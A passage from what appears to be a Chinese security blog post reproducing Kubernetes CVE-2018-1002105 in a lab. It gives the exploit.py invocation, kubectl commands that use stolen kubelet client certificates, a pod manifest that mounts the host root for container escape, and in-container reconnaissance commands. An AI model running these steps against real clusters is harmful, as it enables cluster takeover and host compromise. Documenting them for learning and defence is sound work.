class="line"># cve_2018_1002105_role.yaml</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: Role</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line">  namespace: test</span><br><span class="line">rules:</span><br><span class="line">- apiGroups:</span><br><span class="line">  - &quot;&quot;</span><br><span class="line">  resources:</span><br><span class="line">  - pods</span><br><span class="line">  verbs:</span><br><span class="line">  - get</span><br><span class="line">  - list</span><br><span class="line">  - delete</span><br><span class="line">  - watch</span><br><span class="line">- apiGroups:</span><br><span class="line">  - &quot;&quot;</span><br><span class="line">  resources:</span><br><span class="line">  - pods/exec</span><br><span class="line">  verbs:</span><br><span class="line">  - create</span><br><span class="line">  - get</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"># cve_2018_1002105_role_binding.yaml</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: RoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line">  namespace: test</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: Role</span><br><span class="line">  name: test</span><br><span class="line">subjects:</span><br><span class="line">- apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: Group</span><br><span class="line">  name: test</span><br><span class="line">  </span><br><span class="line">kubectl apply -f cve_2018_1002105_namespace.yaml</span><br><span class="line">kubectl apply -f cve_2018_1002105_role.yaml </span><br><span class="line">kubectl apply -f cve_2018_1002105_rolebinding.yaml</span><br><span class="line">kubectl apply -f cve_2018_1002105_pod.yaml</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/k8s/image-20240105105544003.png" alt="image-20240105105544003"></p>
<p>这里都配置完成之后，也可以安装完成，但是测试请求的时候，报这个没有找到ubuntu容器，不知道为啥<br><img src="/images/k8s/image-20240105145031836.png" alt="image-20240105145031836"></p>
<p>看了一下，好像真的没有。</p>
<p><img src="/images/k8s/image-20240105145248308.png" alt="image-20240105145248308"></p>
<p><code>这里要注意，笔者在这里搭建环境的时候，发现，这个pod文件如果image写  image: ubuntu:latest，是起不来环境的，把image换成上面的image: nginx:1.14.2，这样就可以起来了</code></p>
<p><img src="/images/k8s/image-20240105154754259.png" alt="image-20240105154754259"></p>
<p>简单记录一下思路吧。就是获取到一个pod权限后，使用<code>https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py</code>j脚本打，填写一些信息，</p>
<p>这里在使用exploit.py的时候，没有一个叫http_parser的库</p>
<p>aceback (most recent call last):<br>  File “/tools/others/exp.py”, line 15, in <module><br>    from http_parser.parser import HttpParser<br>ModuleNotFoundError: No module named ‘http_parser’</p>
<p>During handling of the above exception, another exception occurred:</p>
<p>Traceback (most recent call last):<br>  File “/tools/others/exp.py”, line 17, in <module><br>    from http_parser.pyparser import HttpParser<br>ModuleNotFoundError: No module named ‘http_parser’</p>
<p>在kali上面装半天没有装上，索性直接去我的ecs上装了一下，ecs ubuntu20<br><img src="/images/k8s/image-20240105153827456.png" alt="image-20240105153827456"></p>
<p><code>https://github.com/benoitc/http-parser/</code>项目地址，安装完成后，就可以用了，</p>
<p><code>python3 exploit.py --target 172.16.214.18 --port 6443 --bearer-token password --namespace test --pod test</code><br>就可以获取到三个证书文件，<br>有了这三个证书文件，直接就可以直接创建pods，<br>创建pods的</p>
<p><img src="/images/k8s/image-20240105155009473.png" alt="image-20240105155009473"></p>
<p>并且脚本已经把命令给好了，直接打即可，<br><code>kubectl --server=https://ip:6443 --certificate-authority=ca.crt --client-certificate=apiserver-kubelet-client.crt --client-key=apiserver-kubelet-client.key get pods -n kube-system</code></p>
<p><img src="/images/k8s/image-20240105160748881.png" alt="image-20240105160748881"></p>
<p>拿到三个文件，就相当于，接管了整个集群了，接着上面的任意podsrce即可。</p>
<h6 id="k8s逃逸"><a href="#k8s逃逸" class="headerlink" title="k8s逃逸"></a>k8s逃逸</h6><p>有了apiserver的权限就可以逃逸了，主要思路就是，有了apiserver权限，就可以创建pods，在创建的时候，直接把宿主主机的根目录映射出来。下面是创建pods的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#推荐把那个镜像换掉，这里不太清楚为什么拉去不到啊</span><br><span class="line"># attacker.yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: attacker</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: ubuntu</span><br><span class="line">#    image: ubuntu:latest</span><br><span class="line">	image: nginx:1.14.2</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    # Just spin &amp; wait forever</span><br><span class="line">    command: [ &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;--&quot; ]</span><br><span class="line">    args: [ &quot;while true; do sleep 30; done;&quot; ]</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - name: escape-host</span><br><span class="line">      mountPath: /host-escape-door</span><br><span class="line">  volumes:</span><br><span class="line">    - name: escape-host</span><br><span class="line">      hostPath:</span><br><span class="line">        path: /</span><br></pre></td></tr></table></figure>

<p><img src="/images/k8s/image-20240105161604796.png" alt="image-20240105161604796"></p>
<p>打的时候一定要把路径对齐。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl --server=https://ip:6443 --certificate-authority=ca.crt --client-certificate=apiserver-kubelet-client.crt --client-key=apiserver-kubelet-client.key --namespace=default exec -it attacker id</span><br><span class="line"></span><br><span class="line">kubectl --server=https://ip:6443 --certificate-authority=ca.crt --client-certificate=apiserver-kubelet-client.crt --client-key=apiserver-kubelet-client.key --namespace=default exec -it attacker sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/k8s/image-20240105162100408.png" alt="image-20240105162100408"></p>
<p><code>kubectl --server=https://ip:6443 --certificate-authority=ca.crt --client-certificate=apiserver-kubelet-client.crt --client-key=apiserver-kubelet-client.key --namespace=default exec -it attacker id</code></p>
<p><img src="/images/k8s/image-20240105163047960.png" alt="image-20240105163047960"></p>
<p>靶机上看一眼</p>
<p><img src="/images/k8s/image-20240105163129394.png" alt="image-20240105163129394"></p>
<p>参考<code>https://teamssix.com/220324-161756.html#toc-heading-1</code><br>因为这里还是还是</p>
<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>这里其实可思考，在实战中可能出现这种情况的概率非常小，在k8s1.11版本发行的时间为2018年，那么也就是说，在这之后的都不可以了，2018年距今已经6年了，还有一个条件就是，要提前获取到一个pods的低执行权限，从才能下载到三个证书文件。</p>
<h5 id="实战中的一些命令"><a href="#实战中的一些命令" class="headerlink" title="实战中的一些命令"></a>实战中的一些命令</h5><p>总体看k8s的一些cve的漏洞，除了那几个未授权，利用条件似乎都比较苛刻。<br>在实战中，基本上是先拿到一个pods的shell，然后在进行一系列的操作比较多。</p>
<p>当我们获取了一个容器的 shell，首先执行 cat /proc/1/cgroup 是重要的。</p>
<p><img src="D:\myBlog\source_posts\k8s学习及漏洞复现\image-20240110111406947.png" alt="image-20240110111406947"></p>
<p>出现这个kubepods，就是使用k8s进行编排的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">env | grep KUBE</span><br><span class="line">ls -l /run/secrets/kubernetes.io/</span><br><span class="line">df -h</span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/mtab</span><br><span class="line">cat /proc/self/status</span><br><span class="line">cat /proc/self/mounts</span><br><span class="line">cat /proc/net/unix</span><br><span class="line">cat /proc/1/mountinfo</span><br></pre></td></tr></table></figure>

<p><img src="D:\myBlog\source_posts\k8s学习及漏洞复现\image-20240110112309832.png" alt="image-20240110112309832"></p>
<p><code>查看当前环境是否为容器 cat /proc/1/cgroup看回显结果中是否有docker（这个方法一般要比ls /.dockerenv要准确，实测有些容器根目录下确实没有.dockerenv）</code></p>
<h6 id="特权模式判断"><a href="#特权模式判断" class="headerlink" title="特权模式判断"></a>特权模式判断</h6><p>特权模式逃逸是一种最简单有效的逃逸方法，攻击者可以通过挂载宿主机目录到容器某个目录下，直接通过命令、写ssh公钥和crontab等getshell。</p>
<p>创建容器时通过添加–privileged=true参数，将容器以特权模式起动</p>
<p>特权模式起的容器，实战可通过cat /proc/self/status |grep Cap命令判断当前容器是否通过特权模式起（0000001fffffffff代表为特权模式起）</p>
<p>不是</p>
<p><img src="D:\myBlog\source_posts\k8s学习及漏洞复现\image-20240111172526199.png" alt="image-20240111172526199"></p>
<p>简单的判断，也可以使用磁盘挂载命令判断。<br>df -l ，mount</p>
<h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。</p>
<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">K8s etcd未授权访问    https://www.wangan.com/p/11v748294758597c</span><br><span class="line">浅谈 Kubernetes 安全风险 Part.1 http://wjlshare.com/archives/1744</span><br><span class="line">【云安全】k8s 提权漏洞 CVE-2018-1002105 学习 https://teamssix.com/220324-161756.html#toc-heading-5</span><br><span class="line">https://woj.app/7776.html</span><br><span class="line">https://zone.huoxian.cn/d/1153-k8s</span><br><span class="line">https://mp.weixin.qq.com/s/NwyY0MYZRSywsUe-rGytjg</span><br><span class="line">https://www.cnblogs.com/haidragon/p/16843374.html</span><br><span class="line">华为云CTF cloud非预期解之k8s渗透实战   https://annevi.cn/2020/12/21/%e5%8d%8e%e4%b8%ba%e4%ba%91ctf-cloud%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3%e4%b9%8bk8s%e6%b8%97%e9%80%8f%e5%ae%9e%e6%88%98/</span><br><span class="line">https://blog.csdn.net/w1590191166/article/details/122028001</span><br><span class="line">kubernetes 查看所有namespace、默认的namespace https://blog.csdn.net/u013288190/article/details/109674360</span><br><span class="line">https://xz.aliyun.com/t/12921#toc-2</span><br><span class="line">k8s之apiserver组件风险 https://zone.huoxian.cn/u/48984</span><br><span class="line">https://tttang.com/archive/1389/#toc_api-server</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://bohemian.top">bohemian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://bohemian.top/2023/12/25/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8A/">https://bohemian.top/2023/12/25/k8s学习及漏洞复现/k8s学习及漏洞复现-上/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://bohemian.top" target="_blank">Bohemian</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/images/k8s/UzJuMarkDownImage89bb8f54fc5c96249c42867fbf9e8b88.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2023/12/08/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="polarctfweb刷题记录"><img class="cover" src="/images/polarctf/image-20231225150230307.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">polarctfweb刷题记录</div></div><div class="info-2"><div class="info-item-1">misc0和255给到一个py文件，是图片生成坐标点的，也给了坐标点，找chatgpt问一下还原一下代码 12345678910111213141516171819from PIL import Image# 输入坐标点列表image_list = [[255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255,...</div></div></div></a><a class="pagination-related" href="/2024/01/10/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8B/" title="k8s学习及漏洞复现-下"><img class="cover" src="/images/k8s/UzJuMarkDownImage89bb8f54fc5c96249c42867fbf9e8b88.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">k8s学习及漏洞复现-下</div></div><div class="info-2"><div class="info-item-1">1.1docker remote api (2375)k8s与docker总是并行出现的，那么如果docker出现问题，也将是严重的。这里笔者学习复现一下docker的漏洞，docker远程访问漏洞。fofa指纹app=&quot;docker-Daemon&quot; shodan **port:”2375″ country:”JP” Docker**测试是否存在漏洞，这里可以看到，fofa出来的并不是都是2375端口，也可能是附近的，都一样，正常是404，然后加个version，或者2376/containers/json出现信息，也可证明存在漏洞   也可以使用命令进行获取到相关容器。  1.2搭建本地漏洞接下来的操作没有授权，就搭建了一个环境，使用vulhub搭建，很方便。https://github.com/vulhub/vulhub，安装完docker即可 123cd /vulhub/docker/unauthorized-rcedocker-compose builddocker-compose up -d  这里我们pull一个镜像，这里报了一个错，Using...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/website/avatar.jpg" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="author-info-name">bohemian</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bohemiana"><i class="fab fa-github"></i><span>Go Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Bohemiana" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bohemian's blog</div></div><div class="card-widget aside aside-count"><div class="item-headline"><i class="fas fa-hourglass-half"></i><span>人生倒计时</span></div><div class="item-content"><div id="life-progress" ></div> <script src="https://cdn-js.moeworld.top/gh/qxdn/life-progress@latest/autoload.min.js"></script></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#k8s%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">k8s基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84pod%E7%8A%B6%E6%80%81"><span class="toc-number">1.1.</span> <span class="toc-text">常见的pod状态</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#k8s-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">k8s-漏洞环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AEmetarget"><span class="toc-number">2.1.</span> <span class="toc-text">开源项目metarget</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%89%E8%A3%85metarget"><span class="toc-number">2.1.1.</span> <span class="toc-text">安装metarget</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#k8s-%E4%B8%80%E4%BA%9B%E9%87%8D%E8%A6%81%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">k8s 一些重要的命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%888080%E5%92%8C6443%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">Api Server 未授权访问（8080和6443）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#8080%E7%AB%AF%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">2.3.1.</span> <span class="toc-text">8080端口未授权</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%AE%9E%E6%88%98"><span class="toc-number">2.3.2.</span> <span class="toc-text">失败的实战</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%88%90%E5%8A%9F"><span class="toc-number">2.3.3.</span> <span class="toc-text">成功</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6443%E7%AB%AF%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text">6443端口未授权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%B1%E8%B4%A5%E7%9A%84%E4%BB%8Epod%E5%88%B0api-server"><span class="toc-number">2.5.</span> <span class="toc-text">失败的从pod到api server</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">2.5.1.</span> <span class="toc-text">分析过程</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90-%E9%80%9A%E8%BF%87k8s-dashboard%EF%BC%8C%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83Pods"><span class="toc-number">2.6.</span> <span class="toc-text">获取宿主机权限-通过k8s dashboard，创建特权Pods</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E6%83%85%E5%86%B5%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.6.1.</span> <span class="toc-text">正常情况环境搭建</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#skip%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.7.</span> <span class="toc-text">skip配置错误环境搭建</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#k8s10250%E7%AB%AF%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">2.8.</span> <span class="toc-text">k8s10250端口未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%84%8F%E5%A4%96%E7%9A%84%E5%8F%91%E7%8E%B0"><span class="toc-number">2.8.1.</span> <span class="toc-text">意外的发现</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#k8setcd%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">2.9.</span> <span class="toc-text">k8setcd未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%87%BA%E7%8E%B0etcd%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">2.9.1.</span> <span class="toc-text">为什么会出现etcd未授权</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.9.2.</span> <span class="toc-text">漏洞环境搭建</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8"><span class="toc-number">2.9.3.</span> <span class="toc-text">实战利用</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2apiserver%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-CVE-2018-1002105"><span class="toc-number">2.10.</span> <span class="toc-text">历史apiserver提权漏洞(CVE-2018-1002105)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.10.1.</span> <span class="toc-text">漏洞影响版本:</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.10.2.</span> <span class="toc-text">漏洞利用条件:</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.10.3.</span> <span class="toc-text">漏洞利用:</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#k8s%E9%80%83%E9%80%B8"><span class="toc-number">2.10.4.</span> <span class="toc-text">k8s逃逸</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.10.5.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4"><span class="toc-number">2.11.</span> <span class="toc-text">实战中的一些命令</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E5%88%A4%E6%96%AD"><span class="toc-number">2.11.1.</span> <span class="toc-text">特权模式判断</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%B4%E8%B0%A2"><span class="toc-number">2.12.</span> <span class="toc-text">致谢</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.13.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/" title="冰蝎二开0">冰蝎二开0</a><time datetime="2025-06-19T08:52:04.000Z" title="发表于 2025-06-19 16:52:04">2025-06-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/17/%E7%AC%AC%E4%BA%8C%E5%B1%8AParlooCTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/" title="第二届ParlooCTF应急响应挑战赛部分wp">第二届ParlooCTF应急响应挑战赛部分wp</a><time datetime="2025-05-17T02:28:18.000Z" title="发表于 2025-05-17 10:28:18">2025-05-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/lab8-wp/" title="lab8-wp">lab8-wp</a><time datetime="2025-04-14T10:10:30.000Z" title="发表于 2025-04-14 18:10:30">2025-04-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-6(jspx免杀)"/></a><div class="content"><a class="title" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)">哥斯拉二开从0到1-6(jspx免杀)</a><time datetime="2025-02-06T02:21:52.000Z" title="发表于 2025-02-06 10:21:52">2025-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-5(asmx免杀)"/></a><div class="content"><a class="title" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)">哥斯拉二开从0到1-5(asmx免杀)</a><time datetime="2025-01-24T09:37:43.000Z" title="发表于 2025-01-24 17:37:43">2025-01-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By bohemian</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to my <a href="https://bohemian.top/">blog</a>!</div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xindong2020/ButterflyEffects/footer/heart.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
  let initFn = window.walineFn || null
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
  const option = null

  const destroyWaline = ele => ele.destroy()

